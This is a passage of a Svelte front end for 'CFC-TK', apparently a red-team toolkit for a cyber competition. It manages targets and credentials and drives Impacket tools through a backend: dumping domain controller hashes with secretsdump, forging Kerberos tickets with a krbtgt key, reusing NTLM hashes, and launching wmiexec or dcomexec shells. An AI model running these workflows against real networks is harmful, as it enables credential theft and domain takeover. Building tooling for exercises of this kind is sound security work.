    const domainName = targetForm.domainName.trim();

    if (!selectedTeam) {
      targetError = "Select a team first.";
      targetBusy = false;
      return;
    }
    if (!hostname) {
      targetError = "Hostname is required.";
      targetBusy = false;
      return;
    }
    if (!isValidIp(ip)) {
      targetError = "IP must be a valid IPv4 or IPv6 address.";
      targetBusy = false;
      return;
    }
    if (targetForm.domainMode === "existing" && !targetForm.domainId) {
      targetError = "Choose an existing domain or switch to standalone.";
      targetBusy = false;
      return;
    }
    if (targetForm.domainMode === "new" && !domainName) {
      targetError = "New domain name is required.";
      targetBusy = false;
      return;
    }

    const payload: Record<string, unknown> = {
      hostname,
      ip,
      os: targetForm.os
    };
    if (targetForm.domainMode === "existing") {
      payload.domainId = Number(targetForm.domainId);
    }
    if (targetForm.domainMode === "new") {
      payload.domainName = domainName;
    }

    try {
      const response = await fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(selectedTeam)}/targets`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (!response.ok) {
        targetError = await readError(response, "Could not add target.");
        return;
      }

      targetForm = {
        hostname: "",
        ip: "",
        os: "windows",
        domainMode: "standalone",
        domainId: "",
        domainName: ""
      };
      await loadDomains(selectedTeam);
      await loadTargets(selectedTeam);
      if (commandForm.teamName === selectedTeam) {
        await loadCommandTargets(selectedTeam);
      }
      if (easyMode.teamName === selectedTeam) {
        await loadEasyModeData(selectedTeam);
      }
    } catch (error) {
      targetError = error instanceof Error ? error.message : "Could not add target.";
    } finally {
      targetBusy = false;
    }
  };

  const handleDeleteTarget = async (target: Target) => {
    targetError = "";

    if (!selectedTeam) {
      targetError = "Select a team first.";
      return;
    }

    const confirmed = confirm(`Delete target ${target.hostname} (${target.ip})?`);
    if (!confirmed) return;

    targetDeletingId = target.id;
    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(selectedTeam)}/targets/${target.id}`,
        { method: "DELETE" }
      );

      if (!response.ok) {
        targetError = await readError(response, "Could not delete target.");
        return;
      }

      await loadTargets(selectedTeam);
      if (commandForm.teamName === selectedTeam) {
        await loadCommandTargets(selectedTeam);
      }
      if (commandForm.targetId === String(target.id)) {
        commandForm = { ...commandForm, targetId: "", manualTarget: "" };
      }
      if (easyMode.teamName === selectedTeam) {
        await loadEasyModeData(selectedTeam);
        easyMode = {
          ...easyMode,
          dcTargetId: easyMode.dcTargetId === String(target.id) ? "" : easyMode.dcTargetId,
          shellTargetId: easyMode.shellTargetId === String(target.id) ? "" : easyMode.shellTargetId
        };
      }
    } catch (error) {
      targetError = error instanceof Error ? error.message : "Could not delete target.";
    } finally {
      targetDeletingId = null;
    }
  };

  const handleCopyCommand = async () => {
    commandCopied = false;
    commandError = "";

    try {
      await navigator.clipboard.writeText(commandPreview);
      commandCopied = true;
    } catch {
      commandError = "Could not copy command. Select the preview text manually.";
    }
  };

  const handleCopyKerberosEnv = async () => {
    commandCopied = false;
    commandError = "";

    try {
      await navigator.clipboard.writeText(kerberosEnvPreview);
      commandCopied = true;
    } catch {
      commandError = "Could not copy cache environment lines. Select the preview text manually.";
    }
  };

  const handleUseKerberosCache = (cache: KerberosCache) => {
    commandForm = {
      ...commandForm,
      commandKind: "secretsdump",
      authMode: "kerberos",
      domain: cache.domain,
      username: cache.username,
      cachePath: cache.cachePath,
      useKerberosCache: true
    };
  };

  const handleUseCredential = (credential: Credential) => {
    const [lmHash, ntHash] = credential.secret.includes(":")
      ? credential.secret.split(":", 2)
      : ["", credential.secret];
    const nextForm = {
      ...commandForm,
      domain: credential.domain || commandForm.domain,
      username: commandForm.commandKind === "ticketer" ? commandForm.username : credential.username,
      password: credential.secretType === "password" ? credential.secret : commandForm.password,
      lmHash:
        credential.secretType === "ntlm" || credential.secretType === "kerberos-ntlm"
          ? lmHash
          : commandForm.lmHash,
      ntHash:
        credential.secretType === "ntlm" || credential.secretType === "kerberos-ntlm"
          ? ntHash
          : commandForm.ntHash,
      aesKey:
        commandForm.commandKind !== "ticketer" && credential.secretType.includes("aes")
          ? credential.secret
          : commandForm.aesKey,
      krbtgtAesKey:
        commandForm.commandKind === "ticketer" && credential.secretType.includes("aes")
          ? credential.secret
          : commandForm.krbtgtAesKey
    };

    commandForm = nextForm;
  };

  const handleSaveKerberosCache = async () => {
    commandError = "";
    kerberosCacheSaved = false;

    if (!commandForm.teamName) {
      commandError = "Select a team first.";
      return;
    }
    if (commandForm.commandKind !== "getTGT" && commandForm.commandKind !== "ticketer") {
      commandError = "Switch to a Kerberos cache command before saving.";
      return;
    }
    if (!commandForm.domain.trim()) {
      commandError = "Domain is required.";
      return;
    }
    if (!commandForm.username.trim()) {
      commandError = "Username is required.";
      return;
    }
    if (commandForm.commandKind === "ticketer" && !commandForm.domainSid.trim()) {
      commandError = "Domain SID is required for ticketer caches.";
      return;
    }

    const payload = {
      domain: commandForm.domain.trim(),
      username: commandForm.username.trim(),
      method: commandForm.commandKind,
      cachePath: kerberosCachePath,
      kdcHost: commandForm.kdcHost.trim(),
      domainSid: commandForm.domainSid.trim(),
      userId: commandForm.userId.trim(),
      groups: commandForm.groups.trim(),
      extraSid: commandForm.extraSid.trim(),
      duration: commandForm.duration.trim(),
      expiresAt: commandForm.expiresAt.trim(),
      notes: commandForm.notes.trim()
    };

    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(commandForm.teamName)}/kerberos-caches`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }
      );

      if (!response.ok) {
        commandError = await readError(response, "Could not save Kerberos cache.");
        return;
      }

      kerberosCacheSaved = true;
      await loadKerberosCaches(commandForm.teamName);
    } catch (error) {
      commandError = error instanceof Error ? error.message : "Could not save Kerberos cache.";
    }
  };

  const handleRunKerberosTicket = async () => {
    commandError = "";
    commandRunOutput = "";
    kerberosCacheSaved = false;

    if (!commandForm.teamName) {
      commandError = "Select a team first.";
      return;
    }
    if (commandForm.commandKind !== "getTGT" && commandForm.commandKind !== "ticketer") {
      commandError = "Switch to a Kerberos cache command before running.";
      return;
    }
    if (!commandForm.domain.trim()) {
      commandError = "Domain is required.";
      return;
    }
    if (!commandForm.username.trim()) {
      commandError = "Username is required.";
      return;
    }

    commandRunning = true;
    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(commandForm.teamName)}/kerberos-caches/run`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            domain: commandForm.domain.trim(),
            username: commandForm.username.trim(),
            method: commandForm.commandKind,
            toolCommand: impacketToolName(commandForm.commandKind),
            ticketAuthMode: commandForm.ticketAuthMode,
            password: commandForm.password,
            lmHash: commandForm.lmHash.trim(),
            ntHash: commandForm.ntHash.trim(),
            aesKey: commandForm.aesKey.trim(),
            krbtgtAesKey: commandForm.krbtgtAesKey.trim(),
            kdcHost: commandForm.kdcHost.trim(),
            domainSid: commandForm.domainSid.trim(),
            userId: commandForm.userId.trim(),
            groups: commandForm.groups.trim(),
            extraSid: commandForm.extraSid.trim(),
            duration: commandForm.duration.trim(),
            expiresAt: commandForm.expiresAt.trim(),
            notes: commandForm.notes.trim()
          })
        }
      );

      if (!response.ok) {
        commandError = await readError(response, "Could not run Kerberos ticket command.");
        return;
      }

      const result = (await response.json()) as RunKerberosTicketResponse;
      commandForm = { ...commandForm, cachePath: result.cache.cachePath };
      commandRunOutput = result.output || "Ticket command completed.";
      kerberosCacheSaved = true;
      await loadKerberosCaches(commandForm.teamName);
    } catch (error) {
      commandError = error instanceof Error ? error.message : "Could not run Kerberos ticket command.";
    } finally {
      commandRunning = false;
    }
  };

  const handleRunSecretsdump = async () => {
    commandError = "";
    commandRunOutput = "";

    const target = commandTargetAddress;
    if (!commandForm.teamName) {
      commandError = "Select a team first.";
      return;
    }
    if (!target) {
      commandError = "Select a target or enter a manual target.";
      return;
    }
    if (!commandForm.username.trim()) {
      commandError = "Username is required.";
      return;
    }

    commandRunning = true;
    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(commandForm.teamName)}/secretsdump/run`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            toolCommand: impacketToolName("secretsdump"),
            target,
            domain: commandForm.domain.trim(),
            username: commandForm.username.trim(),
            authMode: commandForm.authMode,
            password: commandForm.password,
            lmHash: commandForm.lmHash.trim(),
            ntHash: commandForm.ntHash.trim(),
            aesKey: commandForm.aesKey.trim(),
            kdcHost: commandForm.kdcHost.trim(),
            useKerberosCache: commandForm.useKerberosCache,
            cachePath: kerberosCachePath,
            justDc: commandForm.justDc,
            useVss: commandForm.useVss
          })
        }
      );

      if (!response.ok) {
        commandError = await readError(response, "Could not run secretsdump.");
        return;
      }

      const result = (await response.json()) as RunSecretsdumpResponse;
      commandRunOutput = [
        result.output || "secretsdump completed.",
        "",
        `Imported ${result.credentials.length} credential${result.credentials.length === 1 ? "" : "s"}.`
      ].join("\n");
      if (selectedCredentialTeam === commandForm.teamName) {
        await loadCredentials(selectedCredentialTeam);
      }
    } catch (error) {
      commandError = error instanceof Error ? error.message : "Could not run secretsdump.";
    } finally {
      commandRunning = false;
    }
  };

  const handleLaunchInteractiveCommand = async () => {
    commandError = "";
    commandRunOutput = "";

    const target = commandTargetAddress;
    if (!commandForm.teamName) {
      commandError = "Select a team first.";
      return;
    }
    if (!isInteractiveCommand) {
      commandError = "Switch to an interactive command before launching a terminal.";
      return;
    }
    if (!target) {
      commandError = "Select a target or enter a manual target.";
      return;
    }
    if (!commandForm.username.trim()) {
      commandError = "Username is required.";
      return;
    }

    commandRunning = true;
    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(commandForm.teamName)}/interactive/launch`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            commandKind: commandForm.commandKind,
            dcomObject: commandForm.commandKind === "dcomexec" ? commandForm.dcomObject : "",
            toolCommand: impacketToolName(commandForm.commandKind),
            target,
            targetLabel: selectedCommandTargetLabel,
            domain: commandForm.domain.trim(),
            username: commandForm.username.trim(),
            authMode: commandForm.authMode,
            password: commandForm.password,
            lmHash: commandForm.lmHash.trim(),
            ntHash: commandForm.ntHash.trim(),
            aesKey: commandForm.aesKey.trim(),
            kdcHost: commandForm.kdcHost.trim(),
            useKerberosCache: commandForm.useKerberosCache,
            cachePath: kerberosCachePath
          })
        }
      );

      if (!response.ok) {
        commandError = await readError(response, `Could not launch ${commandForm.commandKind}.`);
        return;
      }

      const result = (await response.json()) as LaunchInteractiveCommandResponse;
      commandRunOutput = `Launched ${result.title} in ${result.terminal}. cfc-tk is not tracking this shell.`;
    } catch (error) {
      commandError = error instanceof Error ? error.message : `Could not launch ${commandForm.commandKind}.`;
    } finally {
      commandRunning = false;
    }
  };

  const handleEasyDumpHashes = async () => {
    easyError = "";
    easyOutput = "";

    if (!easyMode.teamName) {
      easyError = "Select a team first.";
      return;
    }
    if (!selectedEasyDc) {
      easyError = "Pick the domain controller to dump.";
      return;
    }
    if (!selectedEasyCredential) {
      easyError = "Pick a credential.";
      return;
    }

    const auth = credentialToAuth(selectedEasyCredential);
    const target = auth.authMode === "kerberos" ? easyDcFqdn : selectedEasyDc.ip;
    const domain = easyDomainName;

    easyRunning = true;
    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(easyMode.teamName)}/secretsdump/run`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            toolCommand: impacketToolName("secretsdump"),
            target,
            domain,
            username: selectedEasyCredential.username,
            authMode: auth.authMode,
            password: auth.password,
            lmHash: auth.lmHash,
            ntHash: auth.ntHash,
            aesKey: auth.aesKey,
            kdcHost: selectedEasyDc.ip,
            useKerberosCache: false,
            cachePath: "",
            justDc: true,
            useVss: false
          })
        }
      );

      if (!response.ok) {
        easyError = await readError(response, "Could not dump hashes.");
        return;
      }

      const result = (await response.json()) as RunSecretsdumpResponse;
      easyOutput = [
        result.output || "secretsdump completed.",
        "",
        `Imported ${result.credentials.length} credential${result.credentials.length === 1 ? "" : "s"}.`
      ].join("\n");
      await loadEasyModeData(easyMode.teamName);
      if (selectedCredentialTeam === easyMode.teamName) {
        await loadCredentials(selectedCredentialTeam);
      }
      if (commandForm.teamName === easyMode.teamName) {
        await loadCommandCredentials(easyMode.teamName);
      }
    } catch (error) {
      easyError = error instanceof Error ? error.message : "Could not dump hashes.";
    } finally {
      easyRunning = false;
    }
  };

  const handleEasyLaunchWmiexec = async () => {
    easyError = "";
    easyOutput = "";

    if (!easyMode.teamName) {
      easyError = "Select a team first.";
      return;
    }
    if (!selectedEasyShellTarget) {
      easyError = "Pick a shell target.";
      return;
    }
    if (!selectedEasyCredential) {
      easyError = "Pick a credential.";
      return;
    }

    const auth = credentialToAuth(selectedEasyCredential);
    const target = auth.authMode === "kerberos" ? easyShellTargetFqdn : easyShellTargetAddress;

    easyRunning = true;
    try {
      const response = await fetch(
        `${BACKEND_URL}/api/teams/${encodeURIComponent(easyMode.teamName)}/interactive/launch`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            commandKind: "wmiexec",
            dcomObject: "",
            toolCommand: impacketToolName("wmiexec"),
            target,
            targetLabel: selectedEasyShellTarget.hostname || selectedEasyShellTarget.ip,
            domain: easyDomainName,
            username: selectedEasyCredential.username,
            authMode: auth.authMode,
            password: auth.password,
            lmHash: auth.lmHash,
            ntHash: auth.ntHash,
            aesKey: auth.aesKey,
            kdcHost: selectedEasyDc?.ip || "",
            useKerberosCache: false,
            cachePath: ""
          })
        }
      );

      if (!response.ok) {
        easyError = await readError(response, "Could not launch wmiexec.");
        return;
      }

      const result = (await response.json()) as LaunchInteractiveCommandResponse;
      easyOutput = `Launched ${result.title} in ${result.terminal}. cfc-tk is not tracking this shell.`;
    } catch (error) {
      easyError = error instanceof Error ? error.message : "Could not launch wmiexec.";
    } finally {
      easyRunning = false;
    }
  };
</script>

<svelte:head>
  <title>CFC-TK</title>
</svelte:head>

<div class="min-h-screen bg-[#070b0d] text-[#e6edf0]">

  <div class="relative mx-auto flex min-h-screen w-full max-w-7xl flex-col px-4 py-5 sm:px-6 lg:px-8">
    <header class="flex flex-col gap-5 border-b border-white/10 pb-5 md:flex-row md:items-center md:justify-between">
      <div class="flex items-center gap-4">
        <div class="flex h-12 w-12 items-center justify-center rounded-md border border-teal-300/25 bg-white/[0.04]">
          <img src={logo} alt="CFC-TK" class="h-10 w-10 object-contain" />
        </div>
        <div>
          <p class="text-xs font-semibold uppercase tracking-[0.28em] text-teal-200/70">CFC-TK</p>
          <h1 class="text-2xl font-semibold tracking-tight text-white sm:text-3xl">Control surface</h1>
        </div>
      </div>

      <div class="grid grid-cols-3 gap-2 text-sm">
        <div class="rounded-md border border-white/10 bg-white/[0.04] px-4 py-3">
          <p class="text-[11px] uppercase tracking-[0.2em] text-white/45">Teams</p>
          <p class="mt-1 text-xl font-semibold text-teal-100">{teams.length}</p>
        </div>
        <div class="rounded-md border border-white/10 bg-white/[0.04] px-4 py-3">
          <p class="text-[11px] uppercase tracking-[0.2em] text-white/45">Targets</p>
          <p class="mt-1 text-xl font-semibold text-lime-100">{targetTotal}</p>
        </div>
        <div class="rounded-md border border-white/10 bg-white/[0.04] px-4 py-3">
          <p class="text-[11px] uppercase tracking-[0.2em] text-white/45">API</p>
          <p class="mt-1 text-xl font-semibold text-rose-100">8080</p>
        </div>
      </div>
    </header>

    <nav class="mt-6 flex flex-wrap gap-2 border-b border-white/10 pb-3" aria-label="Workspace tabs">
      {#each tabs as tab}
        <button
          type="button"
          class={[
            "rounded-md border px-4 py-3 text-left transition",
            "hover:border-teal-300/45 hover:bg-teal-300/10",
            activeTab === tab.id
              ? "border-teal-300/60 bg-teal-300/12 text-white"
              : "border-white/10 bg-white/[0.03] text-white/65"
          ]}
          aria-pressed={activeTab === tab.id}
          onclick={() => (activeTab = tab.id)}
        >
          <span class="block text-[10px] font-semibold uppercase tracking-[0.22em] text-teal-200/60">{tab.eyebrow}</span>
          <span class="mt-1 block text-sm font-semibold">{tab.label}</span>
        </button>
      {/each}
    </nav>

    <main class="grid flex-1 gap-5 py-6">
      {#if activeTab === "main"}
        <section class="grid min-w-0 gap-5 xl:grid-cols-[minmax(0,1fr)_minmax(0,420px)]">
          <div class="min-w-0 rounded-md border border-white/10 bg-[#0d1316]/90 p-5">
            <div class="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
              <div>
                <p class="text-xs font-semibold uppercase tracking-[0.25em] text-lime-200/60">Main</p>
                <h2 class="mt-2 text-xl font-semibold text-white">Targets</h2>
              </div>
              <div class="flex items-center gap-2 rounded-md border border-teal-300/20 bg-teal-300/8 px-3 py-2 text-sm text-teal-100">
                <Radar class="h-4 w-4" />
                Live API linked
              </div>
            </div>

            <label class="mt-5 grid max-w-md gap-2">
              <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Team</span>
              <select
                bind:value={selectedTeam}
                class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                disabled={teams.length === 0}
              >
                {#each teams as team (team.name)}
                  <option class="bg-[#0d1316]" value={team.name}>{team.name}</option>
                {/each}
              </select>
            </label>

            <div class="mt-5 rounded-md border border-white/10 bg-white/[0.03] p-4">
              <div class="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                <div>
                  <p class="text-xs font-semibold uppercase tracking-[0.2em] text-lime-200/60">Domains</p>
                  <p class="mt-1 text-sm text-white/55">Optional Windows domain grouping for this team.</p>
                </div>
                <form class="flex min-w-0 gap-2" onsubmit={handleAddDomain}>
                  <input
                    bind:value={newDomainName}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-2 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-lime-200/45"
                    placeholder="corp.local"
                    disabled={!selectedTeam || domainBusy}
                  />
                  <Button type="submit" disabled={!selectedTeam || domainBusy} class="bg-lime-200 text-slate-950 hover:bg-lime-100">
                    {domainBusy ? "Adding..." : "Add domain"}
                  </Button>
                </form>
              </div>

              <div class="mt-4 flex flex-wrap gap-2">
                {#if domainsLoading}
                  <span class="rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">Loading domains...</span>
                {:else if domains.length === 0}
                  <span class="rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">No domains yet</span>
                {:else}
                  {#each domains as domain (domain.id)}
                    <span class="rounded-md border border-lime-200/20 bg-lime-200/10 px-3 py-2 text-sm text-lime-100">{domain.name}</span>
                  {/each}
                {/if}
              </div>
              {#if domainError}
                <p class="mt-3 rounded-md border border-rose-300/20 bg-rose-300/10 px-3 py-2 text-sm text-rose-100">{domainError}</p>
              {/if}
            </div>

            <div class="mt-5 grid gap-4">
              {#if targetsLoading}
                <div class="rounded-md border border-white/10 bg-white/[0.03] p-6 text-sm text-white/55">Loading targets...</div>
              {:else if targets.length === 0}
                <div class="rounded-md border border-dashed border-white/15 bg-white/[0.03] p-8 text-center">
                  <ShieldCheck class="mx-auto h-8 w-8 text-teal-100/70" />
                  <h3 class="mt-3 font-semibold text-white">No targets yet</h3>
                  <p class="mt-1 text-sm text-white/55">Add a standalone host or attach one to a domain.</p>
                </div>
              {:else}
                {#each groupedTargets as group (group.name)}
                  <div class="overflow-hidden rounded-md border border-white/10">
                    <div class="border-b border-white/10 bg-white/[0.045] px-4 py-3">
                      <h3 class="font-semibold text-white">{group.name}</h3>
                    </div>
                    <div class="overflow-x-auto">
                      <table class="w-full min-w-[760px] border-collapse text-left text-sm">
                        <thead class="text-xs uppercase tracking-[0.18em] text-white/45">
                          <tr>
                            <th class="px-4 py-3 font-semibold">Hostname</th>
                            <th class="px-4 py-3 font-semibold">IP</th>
                            <th class="px-4 py-3 font-semibold">OS</th>
                            <th class="px-4 py-3 font-semibold">Domain</th>
                            <th class="px-4 py-3 font-semibold">Actions</th>
                          </tr>
                        </thead>
                        <tbody class="divide-y divide-white/10">
                          {#each group.items as target (target.id)}
                            <tr class="transition hover:bg-white/[0.035]">
                              <td class="px-4 py-3 font-medium text-white">{target.hostname}</td>
                              <td class="px-4 py-3 font-mono text-teal-100">{target.ip}</td>
                              <td class="px-4 py-3 capitalize text-white/70">{target.os}</td>
                              <td class="px-4 py-3 text-white/60">{target.domainName || "Standalone"}</td>
                              <td class="px-4 py-3">
                                <button
                                  type="button"
                                  class="inline-flex items-center gap-2 rounded-md border border-rose-300/20 bg-rose-300/10 px-3 py-2 text-xs font-semibold text-rose-100 transition hover:border-rose-200/45 hover:bg-rose-300/15 disabled:cursor-not-allowed disabled:opacity-60"
                                  disabled={targetDeletingId === target.id}
                                  onclick={() => handleDeleteTarget(target)}
                                >
                                  <Trash2 class="h-3.5 w-3.5" />
                                  {targetDeletingId === target.id ? "Deleting" : "Delete"}
                                </button>
                              </td>
                            </tr>
                          {/each}
                        </tbody>
                      </table>
                    </div>
                  </div>
                {/each}
              {/if}

              {#if teams.length === 0}
                <div class="rounded-md border border-dashed border-white/15 bg-white/[0.03] p-8 text-center">
                  <ShieldCheck class="mx-auto h-8 w-8 text-teal-100/70" />
                  <h3 class="mt-3 font-semibold text-white">No teams yet</h3>
                  <p class="mt-1 text-sm text-white/55">Create the first team to populate the roster.</p>
                </div>
              {/if}
            </div>
          </div>

          <aside class="grid min-w-0 gap-5">
          <div class="rounded-md border border-white/10 bg-[#0d1316]/90 p-5">
            <div class="flex items-center gap-3">
              <div class="rounded-md border border-teal-300/25 bg-teal-300/10 p-2 text-teal-100">
                <Plus class="h-4 w-4" />
              </div>
              <div>
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-teal-200/60">New target</p>
                <h2 class="text-lg font-semibold text-white">Add target</h2>
              </div>
            </div>

            <form class="mt-5 grid min-w-0 gap-3" onsubmit={handleAddTarget}>
              <label class="grid gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Hostname</span>
                <input
                  bind:value={targetForm.hostname}
                  required
                  class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                  placeholder="dc01"
                />
              </label>

              <label class="grid gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">IP address</span>
                <input
                  bind:value={targetForm.ip}
                  required
                  class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                  placeholder="10.10.1.5"
                />
              </label>

              <div class="grid gap-3 2xl:grid-cols-2">
                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">OS</span>
                  <select
                    bind:value={targetForm.os}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                  >
                    <option class="bg-[#0d1316]" value="windows">Windows</option>
                    <option class="bg-[#0d1316]" value="linux">Linux</option>
                  </select>
                </label>

                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Domain</span>
                  <select
                    bind:value={targetForm.domainMode}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                  >
                    <option class="bg-[#0d1316]" value="standalone">Standalone</option>
                    <option class="bg-[#0d1316]" value="existing" disabled={domains.length === 0}>Existing domain</option>
                    <option class="bg-[#0d1316]" value="new">New domain</option>
                  </select>
                </label>
              </div>

              {#if targetForm.domainMode === "existing"}
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Existing domain</span>
                  <select
                    bind:value={targetForm.domainId}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                  >
                    <option class="bg-[#0d1316]" value="">Choose domain</option>
                    {#each domains as domain (domain.id)}
                      <option class="bg-[#0d1316]" value={String(domain.id)}>{domain.name}</option>
                    {/each}
                  </select>
                </label>
              {:else if targetForm.domainMode === "new"}
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">New domain name</span>
                  <input
                    bind:value={targetForm.domainName}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="corp.local"
                  />
                </label>
              {/if}

              {#if targetError}
                <p class="rounded-md border border-rose-300/20 bg-rose-300/10 px-3 py-2 text-sm text-rose-100">{targetError}</p>
              {/if}

              <Button type="submit" disabled={targetBusy || !selectedTeam} class="bg-teal-200 text-slate-950 hover:bg-teal-100">
                {targetBusy ? "Adding..." : "Add target"}
              </Button>
            </form>
          </div>

          <div class="rounded-md border border-white/10 bg-[#0d1316]/90 p-5">
            <div class="flex items-center gap-3">
              <div class="rounded-md border border-teal-300/25 bg-teal-300/10 p-2 text-teal-100">
                <Plus class="h-4 w-4" />
              </div>
              <div>
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-teal-200/60">New entry</p>
                <h2 class="text-lg font-semibold text-white">Add team</h2>
              </div>
            </div>

            <form class="mt-5 grid gap-4" onsubmit={handleAddTeam}>
              <div class="grid gap-2">
                <Label for="name" class="text-white/70">Name</Label>
                <Input
                  id="name"
                  name="name"
                  bind:value={newTeam.name}
                  required
                  class="border-white/10 bg-black/30 text-white placeholder:text-white/30"
                  placeholder="blue-01"
                />
              </div>
              <div class="grid gap-2">
                <Label for="subnetId" class="text-white/70">Subnet number</Label>
                <Input
                  id="subnetId"
                  name="subnetId"
                  bind:value={newTeam.subnetId}
                  class="border-white/10 bg-black/30 text-white placeholder:text-white/30"
                  placeholder="12"
                />
              </div>
              <Button type="submit" disabled={busy} class="bg-teal-200 text-slate-950 hover:bg-teal-100">
                {busy ? "Adding..." : "Add team"}
              </Button>
            </form>
          </div>
          </aside>
        </section>
      {:else if activeTab === "easy"}
        <section class="grid min-w-0 gap-5 xl:grid-cols-[minmax(0,420px)_minmax(0,1fr)]">
          <div class="min-w-0 rounded-md border border-white/10 bg-[#0d1316]/90 p-5">
            <ShieldCheck class="h-6 w-6 text-lime-100" />
            <h2 class="mt-4 text-xl font-semibold text-white">Easy mode</h2>
            <p class="mt-2 text-sm leading-6 text-white/60">
              Pick the pieces, then run the common moves without rebuilding the command form.
            </p>

            <div class="mt-6 grid gap-3">
              <label class="grid min-w-0 gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Team</span>
                <select
                  bind:value={easyMode.teamName}
                  class="w-full min-w-0 max-w-full truncate rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-lime-200/45"
                  disabled={teams.length === 0 || easyRunning}
                >
                  {#each teams as team (team.name)}
                    <option class="bg-[#0d1316]" value={team.name}>{team.name}</option>
                  {/each}
                </select>
              </label>

              <label class="grid min-w-0 gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Domain controller</span>
                <select
                  bind:value={easyMode.dcTargetId}
                  class="w-full min-w-0 max-w-full truncate rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-lime-200/45"
                  disabled={easyTargets.length === 0 || easyRunning}
                >
                  <option class="bg-[#0d1316]" value="">Pick DC</option>
                  {#each easyTargets as target (target.id)}
                    <option class="bg-[#0d1316]" value={String(target.id)}>
                      {target.hostname} / {target.ip}{target.domainName ? ` / ${target.domainName}` : ""}
                    </option>
                  {/each}
                </select>
              </label>

              <label class="grid min-w-0 gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Credential</span>
                <div class="min-w-0 rounded-md border border-white/10 bg-black/20 p-3">
                  {#if selectedEasyCredential}
                    <span class="block truncate font-mono text-sm text-teal-100">{credentialIdentity(selectedEasyCredential)}</span>
                    <span class="mt-1 block truncate text-xs text-white/45">
                      {selectedEasyCredential.secretType} / {credentialSecretHint(selectedEasyCredential)} / added {credentialAddedLabel(selectedEasyCredential)}
                    </span>
                    {#if credentialContextLabel(selectedEasyCredential)}
                      <span class="mt-1 block truncate text-xs text-white/35">{credentialContextLabel(selectedEasyCredential)}</span>
                    {/if}
                  {:else}
                    <span class="block text-sm text-white/45">No credential selected.</span>
                  {/if}
                </div>
                <div class="flex flex-wrap gap-2">
                  <Button
                    type="button"
                    disabled={easyCredentialOptions.length === 0 || easyRunning}
                    class="bg-lime-200 text-slate-950 hover:bg-lime-100"
                    onclick={() => (easyCredentialPickerOpen = true)}
                  >
                    Choose credential
                  </Button>
                  <Button
                    type="button"
                    disabled={!easyMode.credentialId || easyRunning}
                    class="border border-white/10 bg-white/[0.06] text-white hover:bg-white/[0.1]"
                    onclick={() => (easyMode = { ...easyMode, credentialId: "" })}
                  >
                    Clear
                  </Button>
                </div>
                <span class="text-xs text-white/35">Newest credentials are listed first, with short hash/key fingerprints.</span>
              </label>

              <label class="grid min-w-0 gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Shell target</span>
                <select
                  bind:value={easyMode.shellTargetId}
                  class="w-full min-w-0 max-w-full truncate rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-lime-200/45"
                  disabled={easyTargets.length === 0 || easyRunning}
                >
                  <option class="bg-[#0d1316]" value="">Pick target</option>
                  {#each easyTargets as target (target.id)}
                    <option class="bg-[#0d1316]" value={String(target.id)}>
                      {target.hostname} / {target.ip}{target.domainName ? ` / ${target.domainName}` : ""}
                    </option>
                  {/each}
                </select>
              </label>
            </div>
